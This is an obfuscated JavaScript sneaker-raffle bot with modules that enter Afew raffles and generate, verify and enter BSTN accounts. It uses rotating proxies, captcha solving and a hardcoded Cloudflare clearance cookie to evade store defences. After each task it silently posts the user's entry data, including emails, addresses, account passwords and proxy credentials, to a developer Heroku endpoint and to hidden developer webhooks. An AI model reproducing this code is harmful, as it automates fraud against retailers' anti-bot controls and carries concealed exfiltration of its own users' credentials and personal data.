                                for (var _0x256b45 of _0x119cd5) {
                                    _0x256b45['option1'] == _0x462ffa && (_0x44e826 = _0x256b45['id']);
                                }
                            } else {
                                var _0xedbc76 = Math['round'](Math['random']() * (_0x119cd5['length'] - 0x1));
                                _0x44e826 = _0x119cd5[_0xedbc76]['id'];
                            }
                            console['log'](_0x3b5c2b() + '\x20[' + _0x71e6b3['name'] + ']\x20Task\x20' + (_0x32a7fc + 0x1) + '\x20:\x20Adding\x20to\x20Cart'), addToCart = await _0x577975('https://raffles.afew-store.com/cart/' + _0x44e826 + ':1'), _0x10d43e = addToCart['request']['res']['responseUrl'];
                        }
                        try {
                            await _0x371d5a();
                        } catch (_0x829ee9) {
                            if (_0x829ee9['message']['includes']('TUNN'))
                                throw new Error('Proxy\x20Connection\x20Error');
                            throw new Error('Proxy\x20Error:\x20' + _0x829ee9);
                        }
                        const _0x425e63 = await _0x446282['newPage']();
                        await _0x425e63['setDefaultNavigationTimeout'](0x1d4c0), await _0x425e63['authenticate']({
                            'username': '' + _0x4b15e0[0x2],
                            'password': '' + _0x4b15e0[0x3]
                        }), await _0x425e63['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x425e63['setRequestInterception'](!![]), _0x425e63['on']('request', _0x4f627c => {
                            _0x4f627c['resourceType']() === 'image' || _0x4f627c['resourceType']() === 'font' || _0x4f627c['resourceType']() === 'media' ? _0x4f627c['abort']() : _0x4f627c['continue']();
                        });
                        try {
                            await _0x425e63['goto'](_0x10d43e, { 'waituntil': 'networkidle0' });
                        } catch {
                            throw new Error('Connection\x20Error');
                        }
                        console['log'](_0x3b5c2b() + '\x20[' + _0x71e6b3['name'] + ']\x20Task\x20' + (_0x32a7fc + 0x1) + '\x20:\x20Submitting\x20Information');
                        try {
                            await _0x425e63['waitForSelector']('#checkout_email');
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0x425e63['type']('#checkout_email', '' + _0x321418[_0x32a7fc]['Email']), await _0x505897(0x320), await _0x425e63['type']('#checkout_attributes_instagram', '' + _0x321418[_0x32a7fc]['Follower']), await _0x505897(0x320), await _0x425e63['select']('#checkout_shipping_address_country', '' + _0x321418[_0x32a7fc]['Country']), await _0x425e63['waitForTimeout'](0x258), await _0x425e63['type']('#checkout_shipping_address_first_name', '' + _0x321418[_0x32a7fc]['FirstName']), await _0x425e63['waitForTimeout'](0x320), await _0x425e63['type']('#checkout_shipping_address_last_name', '' + _0x321418[_0x32a7fc]['LastName']), await _0x425e63['waitForTimeout'](0x2bc), await _0x425e63['type']('#checkout_shipping_address_address1', _0x321418[_0x32a7fc]['Address1'] + '\x20' + _0x321418[_0x32a7fc]['HouseNumber']), await _0x425e63['waitForTimeout'](0x2bc), await _0x425e63['type']('#checkout_shipping_address_address2', '' + _0x321418[_0x32a7fc]['Address2']), await _0x425e63['waitForTimeout'](0x2bc), await _0x425e63['type']('#checkout_shipping_address_zip', '' + _0x321418[_0x32a7fc]['Zip']), await _0x425e63['waitForTimeout'](0x2bc), await _0x425e63['type']('#checkout_shipping_address_city', '' + _0x321418[_0x32a7fc]['City']), await _0x425e63['waitForTimeout'](0x2bc);
                        if (_0x321418[_0x32a7fc]['State'] != '')
                            try {
                                const _0x1e8543 = JSON['parse'](_0x5d8933['readFileSync']('States.json', 'utf8'));
                                await _0x505897(0x1f4);
                                if (_0x321418[_0x32a7fc]['State']['length'] > 0x2)
                                    for (let _0x42ecba of _0x1e8543) {
                                        if (_0x42ecba['Province'] == _0x321418[_0x32a7fc]['State']) {
                                            await _0x425e63['select']('#checkout_shipping_address_province', _0x42ecba['Code']);
                                            break;
                                        }
                                    }
                                else
                                    await _0x425e63['select']('#checkout_shipping_address_province', _0x321418[_0x32a7fc]['State']['toUpperCase']());
                            } catch {
                            }
                        await _0x505897(0x1f4), console['log'](_0x3b5c2b() + '\x20[' + _0x71e6b3['name'] + ']\x20Task\x20' + (_0x32a7fc + 0x1) + '\x20:\x20Getting\x20Shipping'), await _0x505897(0x190), _0x425e63['evaluate'](() => {
                            const _0x449d97 = document['querySelector']('#continue_button');
                            for (var _0x474d92 = 0x0; _0x474d92 < 0x5; _0x474d92++) {
                                if (_0x449d97) {
                                    _0x449d97['click'](), _0x449d97['click']();
                                    break;
                                } else
                                    _0x505897(0xfa0);
                            }
                        }), await _0x425e63['waitForTimeout'](0x9c4);
                        try {
                            await _0x425e63['waitForSelector']('form[data-shipping-method-form=\x22true\x22]'), await _0x425e63['$eval']('form[data-shipping-method-form=\x22true\x22]', _0x5510a4 => _0x5510a4['submit']());
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0x425e63['waitForTimeout'](0x7d0), console['log'](_0x3b5c2b() + '\x20[' + _0x71e6b3['name'] + ']\x20Task\x20' + (_0x32a7fc + 0x1) + '\x20:\x20Finishing\x20Entry');
                        try {
                            await _0x425e63['waitForSelector']('div[data-payment-subform=\x22required\x22]', { 'timeout': 0x186a0 });
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0x505897(0x3e8), await _0x425e63['$eval']('body\x20>\x20div.content\x20>\x20div\x20>\x20div\x20>\x20main\x20>\x20div.step\x20>\x20div\x20>\x20form', _0x32640f => _0x32640f['submit']()), await _0x505897(0x3e8);
                        try {
                            await _0x425e63['waitForSelector']('div[data-last-step=\x22true\x22]', { 'timeout': 0x186a0 });
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0x425e63['$eval']('body\x20>\x20div.content\x20>\x20div\x20>\x20div\x20>\x20main\x20>\x20div.step\x20>\x20form', _0x6d7cfa => _0x6d7cfa['submit']());
                        try {
                            await _0x425e63['waitForSelector']('div[data-step=\x22thank_you\x22]'), _0xad5708 = 'no', _0x11df74(_0x321418[_0x32a7fc], _0x71e6b3), console['log'](_0x4e59da['green'](_0x3b5c2b() + '\x20[' + _0x71e6b3['name'] + ']\x20Task\x20' + (_0x32a7fc + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                            if (_0x4acd48['webhook'] != undefined && _0x4acd48['webhook'] != '')
                                try {
                                    await _0x1abce0(_0x4acd48['webhook'], _0x2d2f0d['succesDEVMSG']);
                                } catch {
                                }
                            await _0x505897(0xc8), await _0x1abce0(_0x5640fd, _0x2d2f0d['succesDEVMSG']), await _0x505897(0xc8);
                            try {
                                await _0x1abce0(_0x1b595f, _0x2d2f0d['succesPUBMSG']);
                            } catch {
                            }
                            try {
                                prxdata = {
                                    'username': _0xdaef84['replace']('#', ''),
                                    'module': _0x71e6b3['name'],
                                    'entrydata': JSON['stringify'](_0x3c7534),
                                    'proxy': '' + _0x508102[_0x32a7fc]
                                };
                                var _0x19b61f = JSON['stringify'](prxdata);
                                let _0x516808 = { 'headers': { 'content-type': 'application/json' } };
                                await _0x577975['post']('https://jraffles.herokuapp.com/success', _0x19b61f, _0x516808);
                            } catch (_0x59c51e) {
                            }
                        } catch (_0x5bbe7a) {
                            throw new Error('Connection\x20Error\x20Fetching\x20Response');
                        }
                    } catch (_0x463b22) {
                        _0x463b22['message']['includes']('selector') && (_0x463b22 = 'Connection\x20Error');
                        console['log'](_0x4e59da['red'](_0x3b5c2b() + '\x20[' + _0x71e6b3['name'] + ']\x20Task\x20' + (_0x32a7fc + 0x1) + '\x20:\x20' + _0x463b22)), _0x2f0fce = '' + _0x463b22;
                        var _0x198ce0 = await _0x429bf8(_0x321418[_0x32a7fc], _0x71e6b3, 'dev', !![], _0x2f0fce);
                        _0x2d2f0d['errorDEV'] = { 'embeds': [_0x198ce0] }, _0x4acd48['webhook'] != undefined && _0x4acd48['webhook'] != '' && await _0x1abce0(_0x4acd48['webhook'], _0x2d2f0d['errorDEV']), await _0x1abce0(_0x3b044a, _0x2d2f0d['errorDEV']), _0xad5708 = 'yes';
                    } finally {
                        _0x446282 && _0x446282['close']();
                        if (_0xad5708 == 'yes' && _0xb8987c != 0x5 && _0x2f0fce != 'Size\x20Not\x20Found') {
                            console['log'](_0x4e59da['red'](_0x3b5c2b() + '\x20[' + _0x71e6b3['name'] + ']\x20Task\x20' + (_0x32a7fc + 0x1) + '\x20:\x20Retrying\x20(' + _0xb8987c + '\x20/\x205)')), _0x32a7fc = _0x32a7fc - 0x1, _0xb8987c = _0xb8987c + 0x1;
                            continue;
                        }
                        _0xad5708 == 'yes' && _0xb8987c >= 0x5 && (_0x260c2d(_0x321418[_0x32a7fc], _0x71e6b3), _0xad5708 = 'no', _0xb8987c = 0x0);
                        if (_0x32a7fc + 0x1 == _0x321418['length']) {
                            await _0x505897(0x7d0);
                            break;
                        }
                        console['log']('Waiting\x20for\x20' + _0x4acd48['AfewDelay'] + '\x20ms'), await _0x505897(_0x4acd48['AfewDelay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'BSTN',
        'modules': [
            {
                'name': 'BSTN\x20Account\x20Generator',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x18add7, _0x4a4564, _0x6b4da2) {
                    _0x367f42['use'](_0x156bf2()), _0x367f42['use'](_0x5ad8e2({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x4acd48['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x45e258 = 0x0; _0x45e258 < _0x4a4564['length']; _0x45e258++) {
                        if (_0x549786 != 'yes')
                            var _0x549786 = '', _0x17a0fb = 0x0;
                        var _0x5ad64d;
                        try {
                            await _0x43797b(_0x4a4564, _0x45e258);
                        } catch {
                            _0x549786 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        _0x4041fe(_0x18add7['name'] + '\x20Task\x20' + (_0x45e258 + 0x1) + '\x20/\x20' + _0x4a4564['length'] + '\x20||\x20File:\x20' + _0x22c4ed + '\x20Proxies:\x20' + _0x5a9fd8);
                        var _0x8a3922 = await _0x429bf8(_0x4a4564[_0x45e258], _0x18add7, 'acc', ![]);
                        const _0x4780fb = { 'succesDEVMSG': { 'embeds': [_0x8a3922] } }, _0x176e51 = 'https://www.bstn.com/eu_en/customer/account/create/';
                        var _0xc28785 = Math['round'](Math['random']() * (_0x6b4da2['length'] - 0x1)), _0x17af93 = _0x6b4da2[_0xc28785]['split'](':'), _0x2ac3a9;
                        try {
                            _0x2ac3a9 = await _0x367f42['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x17af93[0x0] + ':' + _0x17af93[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x2ac3a9 = await _0x367f42['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x17af93[0x0] + ':' + _0x17af93[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x179289 = await _0x2ac3a9['newPage']();
                            await _0x179289['authenticate']({
                                'username': '' + _0x17af93[0x2],
                                'password': '' + _0x17af93[0x3]
                            }), console['log'](_0x3b5c2b() + '\x20[' + _0x18add7['name'] + ']\x20Task\x20' + (_0x45e258 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x179289['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x179289['setRequestInterception'](!![]), _0x179289['on']('request', _0x5f0dab => {
                                _0x5f0dab['resourceType']() === 'image' ? _0x5f0dab['abort']() : _0x5f0dab['continue']();
                            });
                            try {
                                await _0x179289['goto']('' + _0x176e51), await _0x179289['waitForSelector']('button[class=\x22cf2Lf6\x22]');
                            } catch {
                                _0x549786 = 'yes';
                                throw new Error('Proxy\x20Error');
                            }
                            await _0x179289['click']('button[class=\x22cf2Lf6\x22]'), console['log'](_0x3b5c2b() + '\x20[' + _0x18add7['name'] + ']\x20Task\x20' + (_0x45e258 + 0x1) + '\x20:\x20Passing\x20Cloudflare'), await _0x505897(0x7d0), console['log'](_0x3b5c2b() + '\x20[' + _0x18add7['name'] + ']\x20Task\x20' + (_0x45e258 + 0x1) + '\x20:\x20Checking\x20Credentials'), await _0x505897(0x190), await _0x179289['waitForSelector']('#firstname'), await _0x179289['type']('#firstname', _0x4a4564[_0x45e258]['FirstName'], { 'delay': 0xf0 }), await _0x505897(0x190), await _0x179289['type']('#lastname', _0x4a4564[_0x45e258]['LastName'], { 'delay': 0xe6 }), await _0x505897(0x190), await _0x179289['type']('#email_address', _0x4a4564[_0x45e258]['Email'], { 'delay': 0x122 }), await _0x505897(0x190), await _0x179289['type']('#password', _0x4a4564[_0x45e258]['Password'], { 'delay': 0x82 }), await _0x505897(0x1f4), await _0x179289['type']('#password-confirmation', _0x4a4564[_0x45e258]['Password'], { 'delay': 0x7c }), console['log'](_0x3b5c2b() + '\x20[' + _0x18add7['name'] + ']\x20Task\x20' + (_0x45e258 + 0x1) + '\x20:\x20Sending\x20Request'), await _0x505897(0x2bc), await _0x179289['$eval']('#form-validate', _0x2f94eb => _0x2f94eb['submit']()), await _0x505897(0x1388);
                            const _0x5d2949 = await _0x179289['$']('#email_address-error');
                            if (_0x5d2949)
                                throw new Error('Invalid\x20Email');
                            const _0x608a2c = await _0x179289['$']('#password-error');
                            if (_0x608a2c)
                                throw new Error('Invalid\x20Password');
                            await _0x179289['waitForSelector']('div.mesg-success'), _0x549786 = 'no', console['log'](_0x4e59da['green'](_0x3b5c2b() + '\x20[' + _0x18add7['name'] + ']\x20Task\x20' + (_0x45e258 + 0x1) + '\x20:\x20Account\x20' + _0x4a4564[_0x45e258]['Email'] + '\x20Generated')), _0x5d8933['appendFileSync']('../accounts/bstn.csv', '\x0a' + _0x4a4564[_0x45e258]['Email'] + ',' + _0x4a4564[_0x45e258]['Password']);
                            try {
                                _0x4acd48['webhook'] != undefined && _0x4acd48['webhook'] != '' && await _0x1abce0(_0x4acd48['webhook'], _0x4780fb['succesDEVMSG']);
                            } catch {
                            }
                            await _0x1abce0(_0x3faf08, _0x4780fb['succesDEVMSG']);
                            let _0x5330dc = _0x4a4564[_0x45e258];
                            try {
                                prxdata = {
                                    'username': _0xdaef84['replace']('#', ''),
                                    'module': _0x18add7['name'],
                                    'entrydata': JSON['stringify'](_0x5330dc),
                                    'proxy': '' + _0x6b4da2[_0x45e258]
                                };
                                var _0x16e56c = JSON['stringify'](prxdata);
                                let _0x45176b = { 'headers': { 'content-type': 'application/json' } };
                                await _0x577975['post']('https://jraffles.herokuapp.com/success', _0x16e56c, _0x45176b);
                            } catch (_0x12b0a6) {
                            }
                            console['log'](_0x4e59da['yellow'](_0x3b5c2b() + '\x20[' + _0x18add7['name'] + ']\x20Task\x20' + (_0x45e258 + 0x1) + '\x20:\x20After\x20your\x20all\x20tasks\x20are\x20finished,\x20run\x20\x27BSTN\x20Account\x20Verifier\x27'));
                        } catch (_0x42cc5c) {
                            console['log'](_0x4e59da['red'](_0x3b5c2b() + '\x20[' + _0x18add7['name'] + ']\x20Task\x20' + (_0x45e258 + 0x1) + '\x20:\x20' + _0x42cc5c)), _0x5ad64d = '' + _0x42cc5c;
                            var _0x361040 = await _0x429bf8(_0x4a4564[_0x45e258], _0x18add7, 'acc', !![], _0x5ad64d);
                            _0x4780fb['errorDEV'] = { 'embeds': [_0x361040] }, _0x4acd48['webhook'] != undefined && _0x4acd48['webhook'] != '' && await _0x1abce0(_0x4acd48['webhook'], _0x4780fb['errorDEV']), await _0x1abce0(_0x3b044a, _0x4780fb['errorDEV']), _0x549786 = 'yes';
                        } finally {
                            if (_0x2ac3a9)
                                _0x2ac3a9['close']();
                            if (_0x549786 == 'yes' && _0x17a0fb != 0x5) {
                                console['log'](_0x4e59da['red'](_0x3b5c2b() + '\x20[' + _0x18add7['name'] + ']\x20Task\x20' + (_0x45e258 + 0x1) + '\x20:\x20Retrying\x20(' + _0x17a0fb + '\x20/\x205)')), _0x45e258 = _0x45e258 - 0x1, _0x17a0fb = _0x17a0fb + 0x1;
                                continue;
                            }
                            _0x549786 == 'yes' && _0x17a0fb >= 0x5 && (_0x260c2d(_0x4a4564[_0x45e258], _0x18add7), _0x549786 = 'no', _0x17a0fb = 0x0), console['log'](_0x3b5c2b() + '\x20[' + _0x18add7['name'] + ']\x20Waiting\x20for\x20' + _0x4acd48['delay'] + '\x20ms'), await _0x505897(_0x4acd48['delay']);
                        }
                    }
                }
            },
            {
                'name': 'BSTN\x20Account\x20Verifier',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x589d3a, _0x2a9b88) {
                    var _0x27dbfd = ![], _0x433a9a = [];
                    async function _0x7af06c() {
                        var _0x2f2bc7 = new _0x196441({
                            'user': _0x4acd48['masterMail'],
                            'password': _0x4acd48['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0x2711ec(_0x2322b9) {
                            _0x2f2bc7['openBox']('INBOX', ![], _0x2322b9);
                        }
                        _0x2f2bc7['once']('ready', function () {
                            _0x2711ec(function (_0x1989e5, _0x461611) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0x1989e5)
                                    throw _0x1989e5;
                                _0x2f2bc7['seq']['search']([
                                    'UNSEEN',
                                    [
                                        'SUBJECT',
                                        'Please\x20confirm\x20your\x20BSTN\x20Store\x20account'
                                    ]
                                ], function (_0x1e6d1a, _0x27717b) {
                                    if (!_0x27717b || !_0x27717b['length'])
                                        console['log'](_0x3b5c2b() + '\x20[' + _0x589d3a['name'] + ']\x20No\x20mails\x20found'), _0x2f2bc7['end']();
                                    else {
                                        var _0x33c080 = _0x2f2bc7['seq']['fetch'](_0x27717b, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0x33c080['on']('message', function (_0xd6f687, _0x388a99) {
                                            var _0x134681 = '(#' + _0x388a99 + ')\x20';
                                            _0xd6f687['on']('body', function (_0x3c04a9, _0x1165f2) {
                                                _0x158053(_0x3c04a9, (_0x3e07ec, _0x4b63a5) => {
                                                    var _0x3ca1cc = _0x4b63a5['text']['split']('[')[0x2], _0x5db565 = _0x3ca1cc['split'](']')[0x0];
                                                    _0x433a9a['push'](_0x5db565);
                                                });
                                            }), _0xd6f687['once']('end', function () {
                                            });
                                        }), _0x33c080['once']('error', function (_0x3ac2e1) {
                                            console['log']('Fetch\x20error:\x20' + _0x3ac2e1), _0x27dbfd = !![];
                                        }), _0x33c080['once']('end', function () {
                                            _0x2f2bc7['end'](), _0x27dbfd = !![];
                                        });
                                    }
                                });
                            });
                        }), _0x2f2bc7['once']('error', function (_0x378f7e) {
                            console['log'](_0x4e59da['red'](_0x378f7e['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox'), _0x27dbfd = !![];
                        }), _0x2f2bc7['once']('end', async function () {
                            _0x27dbfd = !![];
                        }), _0x2f2bc7['connect']();
                    }
                    async function _0x5776d7(_0x1c3b9d, _0x4fd9e5, _0x403c6b) {
                        _0x367f42['use'](_0x156bf2());
                        for (var _0x69e916 = 0x0; _0x69e916 < _0x4fd9e5['length']; _0x69e916++) {
                            if (_0x38941c != 'yes')
                                var _0x38941c = '', _0x4d7f27 = 0x0;
                            var _0x8cbef5 = Math['round'](Math['random']() * (_0x403c6b['length'] - 0x1)), _0x1088bf = _0x403c6b[_0x8cbef5]['split'](':'), _0x15971b;
                            try {
                                _0x15971b = await _0x367f42['launch']({
                                    'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                    'headless': !![],
                                    'args': [
                                        '--proxy-server=' + _0x1088bf[0x0] + ':' + _0x1088bf[0x1],
                                        '--no-sandbox',
                                        '--disable-setuid-sandbox'
                                    ]
                                });
                            } catch {
                                _0x15971b = await _0x367f42['launch']({
                                    'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                    'headless': !![],
                                    'args': [
                                        '--proxy-server=' + _0x1088bf[0x0] + ':' + _0x1088bf[0x1],
                                        '--no-sandbox',
                                        '--disable-setuid-sandbox'
                                    ]
                                });
                            }
                            try {
                                const _0x27bef3 = await _0x15971b['newPage']();
                                await _0x27bef3['authenticate']({
                                    'username': '' + _0x1088bf[0x2],
                                    'password': '' + _0x1088bf[0x3]
                                }), console['log'](_0x3b5c2b() + '\x20[' + _0x1c3b9d['name'] + ']\x20Task\x20' + (_0x69e916 + 0x1) + '\x20:\x20Starting\x20Verification'), await _0x27bef3['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x27bef3['setRequestInterception'](!![]), _0x27bef3['on']('request', _0x34f9a1 => {
                                    _0x34f9a1['resourceType']() === 'image' || _0x34f9a1['resourceType']() === 'font' || _0x34f9a1['resourceType']() === 'media' ? _0x34f9a1['abort']() : _0x34f9a1['continue']();
                                }), console['log'](_0x3b5c2b() + '\x20[' + _0x1c3b9d['name'] + ']\x20Task\x20' + (_0x69e916 + 0x1) + '\x20:\x20Getting\x20Session');
                                try {
                                    await _0x27bef3['goto'](_0x4fd9e5[_0x69e916]);
                                } catch {
                                    _0x38941c = 'yes';
                                    throw new Error('Connection\x20Error');
                                }
                                console['log'](_0x3b5c2b() + '\x20[' + _0x1c3b9d['name'] + ']\x20Task\x20' + (_0x69e916 + 0x1) + '\x20:\x20Passing\x20Cloudflare'), await _0x27bef3['waitForTimeout'](0xbb8);
                                try {
                                    await _0x27bef3['waitForSelector']('.account-nav'), _0x38941c = 'no', console['log'](_0x4e59da['green'](_0x3b5c2b() + '\x20[' + _0x1c3b9d['name'] + ']\x20Task\x20' + (_0x69e916 + 0x1) + '\x20:\x20Verification\x20Successful'));
                                    var _0x3a09eb = await _0x429bf8(null, _0x1c3b9d, 'ver', ![]);
                                    const _0x11a46d = { 'succesDEVMSG': { 'embeds': [_0x3a09eb] } };
                                    await _0x1abce0(_0x121d8e, _0x11a46d['succesDEVMSG']);
                                } catch {
                                    _0x38941c = 'no';
                                    throw new Error('Link\x20Already\x20Verified,\x20skipping..');
                                }
                            } catch (_0x23a287) {
                                console['log'](_0x4e59da['red'](_0x3b5c2b() + '\x20[' + _0x1c3b9d['name'] + ']\x20Task\x20' + (_0x69e916 + 0x1) + '\x20:\x20' + _0x23a287));
                                var _0x12fa60 = _0x23a287, _0x297771 = await _0x429bf8(null, _0x1c3b9d, 'ver', !![], _0x12fa60);
                                const _0xabd13f = { 'errorDEVMSG': { 'embeds': [_0x297771] } };
                                _0x4acd48['webhook'] != undefined && _0x4acd48['webhook'] != '' && await _0x1abce0(_0x4acd48['webhook'], _0xabd13f['errorDEVMSG']), await _0x1abce0(_0x3b044a, _0xabd13f['errorDEVMSG']);
                            } finally {
                                _0x15971b['close']();
                                if (_0x38941c == 'yes' && _0x4d7f27 != 0x5) {
                                    console['log'](_0x4e59da['red'](_0x3b5c2b() + '\x20[' + _0x1c3b9d['name'] + ']\x20Task\x20' + (_0x69e916 + 0x1) + '\x20:\x20Retrying\x20(' + _0x4d7f27 + '\x20/\x205)')), _0x69e916 = _0x69e916 - 0x1, _0x4d7f27 = _0x4d7f27 + 0x1;
                                    continue;
                                }
                                _0x38941c == 'yes' && _0x4d7f27 >= 0x5 && (_0x38941c = 'no', _0x4d7f27 = 0x0), console['log'](_0x3b5c2b() + '\x20[' + _0x1c3b9d['name'] + ']\x20Waiting\x20for\x20' + _0x4acd48['delay'] + '\x20ms'), await _0x505897(_0x4acd48['delay']);
                            }
                        }
                    }
                    try {
                        _0x7af06c();
                        while (!_0x27dbfd) {
                            await _0x505897(0xfa0);
                        }
                        console['log']('Found\x20' + _0x433a9a['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..'), await _0x505897(0x7d0);
                    }
                    await _0x5776d7(_0x589d3a, _0x433a9a, _0x2a9b88);
                }
            },
            {
                'name': 'BSTN\x20Raffle\x20Entries',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x29e13e, _0x249166, _0x45c49f) {
                    _0x367f42['use'](_0x156bf2()), _0x367f42['use'](_0x5ad8e2({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x4acd48['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x187b10 = 0x0; _0x187b10 < _0x249166['length']; _0x187b10++) {
                        var _0x4058a2, _0xe0521d = _0x249166[_0x187b10];
                        try {
                            await _0x43797b(_0x249166, _0x187b10);
                        } catch {
                            _0x3091e1 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        async function _0x6f217e(_0x4b37d6) {
                            const _0x56acc6 = _0x5d8933['readFileSync']('../successful-tasks.csv', 'utf8'), _0x1e6d42 = _0x4d4612['parse'](_0x56acc6, { 'header': !![] })['data'];
                            let _0x19c5bf = ![];
                            for (var _0x54cc53 of _0x1e6d42) {
                                if (_0x54cc53['Url'] == _0x4b37d6['Url'] && _0x54cc53['Email'] == _0x4b37d6['Email']) {
                                    _0x19c5bf = !![];
                                    break;
                                }
                            }
                            return _0x19c5bf;
                        }
                        if (await _0x6f217e(_0x249166[_0x187b10]) == !![]) {
                            console['log'](_0x3b5c2b() + '\x20[' + _0x29e13e['name'] + ']\x20Task\x20' + (_0x187b10 + 0x1) + '\x20:\x20Task\x20Already\x20Entered,\x20Going\x20to\x20Next\x20Task');
                            continue;
                        }
                        if (_0x3091e1 != 'yes')
                            var _0x3091e1 = '', _0x225d41 = 0x0;
                        _0x4041fe(_0x29e13e['name'] + '\x20Task\x20' + (_0x187b10 + 0x1) + '\x20/\x20' + _0x249166['length'] + '\x20||\x20File:\x20' + _0x22c4ed + '\x20Proxies:\x20' + _0x5a9fd8);
                        var _0x5a8d54 = Math['round'](Math['random']() * (_0x45c49f['length'] - 0x1)), _0x15be8f = _0x45c49f[_0x5a8d54]['split'](':'), _0x3e42df;
                        try {
                            _0x3e42df = await _0x367f42['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x15be8f[0x0] + ':' + _0x15be8f[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x3e42df = await _0x367f42['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x15be8f[0x0] + ':' + _0x15be8f[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x4d5292 = await _0x3e42df['newPage'](), _0xdea713 = await _0x4d5292['target']()['createCDPSession'](), { windowId: _0x1c8c97 } = await _0xdea713['send']('Browser.getWindowForTarget');
                            await _0x4d5292['setViewport']({
                                'width': 0x501,
                                'height': 0x2d0
                            });
                            var _0x476acf = [{
                                'name': 'cf_clearance',
                                'value': 'uyuh7Wo9shR3zcpWvbWJ04mG0iNC2N25mhp1FNAbHYY-1676282182-0-1-9764d0ee.e7bea100.c0658f0e-160',
                                'domain': '.bstn.com',
                                'path': '/',
                                'expires': 1707818183.331533,
                                'httpOnly': !![],
                                'secure': !![]
                            }];
                            await _0x4d5292['authenticate']({
                                'username': '' + _0x15be8f[0x2],
                                'password': '' + _0x15be8f[0x3]
                            }), console['log'](_0x3b5c2b() + '\x20[' + _0x29e13e['name'] + ']\x20Task\x20' + (_0x187b10 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x4d5292['goto']('' + _0x249166[_0x187b10]['Url'], { 'waitUntil': 'networkidle2' }), console['log'](_0x3b5c2b() + '\x20[' + _0x29e13e['name'] + ']\x20Task\x20' + (_0x187b10 + 0x1) + '\x20:\x20Solving\x20Cloudflare');
                            try {
                                await _0x4d5292['waitForSelector']('.nonLoggedSpecific_nonLogged__SCu0L');
                            } catch {
                                throw new Error('Blocked\x20by\x20Cloudflare');
                            }
                            await _0xdea713['send']('Browser.setWindowBounds', {
                                'windowId': _0x1c8c97,
                                'bounds': { 'windowState': 'minimized' }
